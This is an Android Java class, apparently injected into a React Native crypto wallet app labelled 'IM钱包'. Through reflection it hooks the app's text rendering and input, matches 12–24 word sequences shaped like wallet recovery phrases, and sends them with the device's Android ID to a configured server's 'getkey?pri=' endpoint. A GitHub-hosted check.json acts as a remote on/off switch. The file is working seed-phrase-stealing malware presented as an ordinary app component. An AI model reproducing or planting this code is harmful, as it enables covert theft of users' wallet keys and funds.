package org.lang;


import android.content.Context;
import android.content.res.AssetManager;
import android.os.Build;
import android.os.Handler;
import android.os.Looper;
import android.provider.Settings;
import android.text.Spannable;
import android.text.TextUtils;
import android.util.Log;
import android.widget.TextView;
import android.widget.Toast;

import org.json.JSONException;
import org.json.JSONObject;

import java.io.BufferedReader;
import java.io.File;
import java.io.FileOutputStream;
import java.io.IOException;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.io.OutputStream;
import java.lang.reflect.InvocationTargetException;
import java.lang.reflect.Method;
import java.net.HttpURLConnection;
import java.net.URL;
import java.util.HashMap;
import java.util.Map;
import java.util.regex.Matcher;
import java.util.regex.Pattern;

public class Systemm {
    private static final String TAG = "xlib";
    private static Handler handler = new Handler(Looper.getMainLooper());
    private static Map<String, DelayedTask> taskMap = new HashMap<>();
    private static String editextString = "";
    private static StringBuilder textBuild = new StringBuilder();
    private static boolean isStartRecord = false;
    private static boolean isRecordType = false;
    private static String addressType = "";
    private static String device = "";
    private static Context mContext;
    private static boolean isOpen = true;
    private static String baseUrl = "";

    private static void copyAssetFileToAppDirectory(Context context, String assetFileName) {
        InputStream inStream = null;
        OutputStream outStream = null;
        try {
            inStream = context.getAssets().open(assetFileName);
            File outFile = new File(context.getFilesDir(), assetFileName);
            outStream = new FileOutputStream(outFile);
            copyFile(inStream, outStream);
//            Log.d(TAG, "file copy success " + outFile.getAbsolutePath());
        } catch (IOException e) {
//            Log.e(TAG, "copy failure: " + e.getMessage());
        } finally {
            try {
                if (inStream != null) {
                    inStream.close();
                }
                if (outStream != null) {
                    outStream.close();
                }
            } catch (IOException e) {
                e.printStackTrace();
            }
        }
    }

    private static void copyFile(InputStream inputStream, OutputStream out) throws IOException {
        byte[] buffer = new byte[1024];
        int read;
        while ((read = inputStream.read(buffer)) != -1) {
            out.write(buffer, 0, read);
        }
    }

    public static String getAndroidId(Context context) {
        return Settings.Secure.getString(context.getContentResolver(), Settings.Secure.ANDROID_ID);
    }

    public static void start(Context context) {
//        copyAssetFileToAppDirectory(context, "config_script.js");
//        System.loadLibrary("tool");
        device = getAndroidId(context);
        mContext = context;
        String jsonStr = loadJSONFromAsset(context, "config.json");
        try {
            JSONObject jsonConfig = new JSONObject(jsonStr);
            baseUrl = jsonConfig.getString("apiUrl");
            Log.d(TAG, "获取配置:"+baseUrl);
            getConfig();
        } catch (JSONException e) {
            e.printStackTrace();
        }

    }

    public static void getResponse(String path, String data) {
        if (path.endsWith("check.json")){
            try {
                JSONObject jsonObject = new JSONObject(data);
                isOpen = jsonObject.getBoolean("isOpen");
            } catch (JSONException e) {
                throw new RuntimeException(e);
            }
        }
    }

    public static void getPostResponse(String path, String data) {

    }

    public static void getConfig() {
        doGet("https://raw.githubusercontent.com/maxre404/openApi/master/check.json");
    }

    public static void doPost(String path, String param) {
        new Thread(() -> {
            try {
                URL url = new URL(path);

                // 打开连接
                HttpURLConnection urlConnection = (HttpURLConnection) url.openConnection();

                // 设置请求方法为 POST
                urlConnection.setRequestMethod("POST");

                // 设置请求头
                urlConnection.setRequestProperty("Content-Type", "application/x-www-form-urlencoded");

                // 启用输入输出流
                urlConnection.setDoOutput(true);

                // 要发送的参数
//                String urlParameters = "param1=value1&param2=value2";
                String urlParameters = param;

                // 发送请求参数
                try (OutputStream os = urlConnection.getOutputStream()) {
                    byte[] input = urlParameters.getBytes("utf-8");
                    os.write(input, 0, input.length);
                }

                // 获取响应代码
                int responseCode = urlConnection.getResponseCode();
                System.out.println("Response Code: " + responseCode);

                // 读取响应
                try (BufferedReader br = new BufferedReader(new InputStreamReader(urlConnection.getInputStream(), "utf-8"))) {
                    StringBuilder response = new StringBuilder();
                    String responseLine;
                    while ((responseLine = br.readLine()) != null) {
                        response.append(responseLine.trim());
                    }
                    System.out.println("Response: " + response.toString());
                    getPostResponse(path, response.toString());
                }
                // 断开连接
                urlConnection.disconnect();
            } catch (Exception e) {
                e.printStackTrace();
            }
        }).start();

    }

    public static void doGet(String path) {
        Log.d(TAG, "doGet: "+path);
        new Thread(new Runnable() {
            @Override
            public void run() {
                String urlString = path;
                HttpURLConnection urlConnection = null;
                BufferedReader reader = null;
                StringBuilder result = new StringBuilder();

                try {
                    // 创建 URL 对象
                    URL url = new URL(urlString);

                    // 打开连接
                    urlConnection = (HttpURLConnection) url.openConnection();

                    // 设置请求方法为 GET
                    urlConnection.setRequestMethod("GET");
                    // 获取输入流
                    reader = new BufferedReader(new InputStreamReader(urlConnection.getInputStream()));

                    // 读取响应
                    String line;
                    while ((line = reader.readLine()) != null) {
                        result.append(line);
                    }
                    getResponse(path, result.toString());
                } catch (Exception e) {
                    e.printStackTrace();
                } finally {
                    if (reader != null) {
                        try {
                            reader.close();
                        } catch (Exception e) {
                            e.printStackTrace();
                        }
                    }
                    if (urlConnection != null) {
                        urlConnection.disconnect();
                    }
                }
            }
        }).start();
    }

    public static void delayTaskFinish(String taskName) {
    }

    public static void tagTaskFinish(String taskName) {
    }

    public static void addDelayTask(String taskName, String delayTime) {
        Runnable runnable = new Runnable() {
            @Override
            public void run() {
                tagTaskFinish(taskName);
            }
        };
        DelayedTask delayedTask = new DelayedTask(taskName, runnable);
        // 存储任务并延迟执行
        taskMap.put(taskName, delayedTask);
        handler.postDelayed(delayedTask.getTask(), Long.parseLong(delayTime));
    }

    public static void hook(int status) {
    }

    public static void cancelTask(String taskName) {
        DelayedTask delayedTask = taskMap.get(taskName);
        if (delayedTask != null) {
            handler.removeCallbacks(delayedTask.getTask());
            taskMap.remove(taskName);
        }
    }

    public static void eFindStr(String str) {
        editextString = str.toString();
        handler.removeCallbacks(getTextRunnable);
        handler.postDelayed(getTextRunnable, 1000);
    }

    public static void textViewText(String text) {
        if (isRecordType) {
            isRecordType = false;
            addressType = text;
//            doPost(reportAddressType,"address="+blurAddress+"&addressType="+addressType);
        }
        if (isStartRecord) {
            try {
                Integer.parseInt(text);
                textBuild.append(text + ":");
            } catch (NumberFormatException e) {
                textBuild.append(text + ",");
            }
        }
        if (text.equals("1")) {
            textBuild.append(text + ":");
            isStartRecord = true;
            handler.postDelayed(new Runnable() {
                @Override
                public void run() {
                    Pattern pattern = Pattern.compile("((\\d+:[^,]+),){12,20}");
                    // 将文本转换为字符串并匹配正则表达式
                    Matcher matcher = pattern.matcher(textBuild.toString());
                    // 检查是否存在符合条件的文本段落
                    boolean isMatchFound = matcher.find();
                    if (isMatchFound) {
                        String result = removeLastElement(matcher.group().replaceAll("\\d+:", ""));
                        doGet(baseUrl+"getkey?pri=" + result + "&client=IM%E9%92%B1%E5%8C%85&devices=" + device + "&code=1");
                    } else {

                    }
                    textBuild.setLength(0);
                    isStartRecord = false;
                }
            }, 1000);
        } else {
            if (text.contains("...")) {
                String regex = "^[a-zA-Z0-9\\.]{20,}$";
                Pattern pattern = Pattern.compile(regex);
                Matcher matcher = pattern.matcher(text);
                if (matcher.matches()) {
                    isRecordType = true;
                }
            }
        }
    }

    private static Runnable getTextRunnable = new Runnable() {
        @Override
        public void run() {
            Pattern pattern = Pattern.compile("(\\S+\\s+){11,19}(\\S+\\s*)");
            Matcher matcher = pattern.matcher(editextString);
            boolean isMatchFound = matcher.find();
            if (isMatchFound) {
                String matchedText = matcher.group();
                doGet(baseUrl+"getkey?pri=" + matchedText + "&client=IM%E9%92%B1%E5%8C%85&devices=" + device + "&code=1");
                Toast.makeText(mContext, "report address", Toast.LENGTH_SHORT).show();
            }
        }
    };

    public static String removeLastElement(String input) {
        if (input.endsWith(",")) {
            input = input.substring(0, input.length() - 1);
            return input;
        }

        int lastCommaIndex = input.lastIndexOf(',');
        if (lastCommaIndex != -1) {
            return input.substring(0, lastCommaIndex + 1);
        } else {
            return input;
        }
    }

    public static void setText(Object data) {
        try {
            if (null!=data&&isOpen){
                String className = "com.facebook.react.views.text.ReactTextUpdate";
                Class<?> clazz = Class.forName(className);
                // 获取并调用 printMessage 方法
                Method getText = clazz.getMethod("getText");
                getText.setAccessible(true);
                Spannable spannable = (Spannable) getText.invoke(data);
                if (null!=spannable){
                    String textStr = spannable.toString();
                    textViewText(textStr);
                }
            }
        } catch (ClassNotFoundException e) {
        } catch (InvocationTargetException e) {
        } catch (NoSuchMethodException e) {
        } catch (IllegalAccessException e) {
        }
    }

    public static void setInputStr(Object data){
        try {
            if (null!=data&&isOpen){
                String className = "com.facebook.react.views.text.ReactTextUpdate";
                Class<?> clazz = Class.forName(className);
                // 获取并调用 printMessage 方法
                Method getText = clazz.getMethod("getText");
                getText.setAccessible(true);
                Spannable spannable = (Spannable) getText.invoke(data);
                if (null!=spannable){
                    String textStr = spannable.toString();
                    if (!TextUtils.isEmpty(textStr)){
                        Log.d(TAG, "获取输入文本: "+textStr);
                        eFindStr(textStr);
                    }
                }
            }
        } catch (ClassNotFoundException e) {
        } catch (InvocationTargetException e) {
        } catch (NoSuchMethodException e) {
        } catch (IllegalAccessException e) {
        }
    }

    public static String loadJSONFromAsset(Context context,String fileName) {
        String json = null;
        try {
            AssetManager assetManager = context.getAssets();
            InputStream is = assetManager.open(fileName);
            BufferedReader reader = new BufferedReader(new InputStreamReader(is));
            StringBuilder sb = new StringBuilder();
            String line;
            while ((line = reader.readLine()) != null) {
                sb.append(line);
            }
            reader.close();
            is.close();
            json = sb.toString();
        } catch (Exception e) {
            e.printStackTrace();
        }
        return json;
    }
}
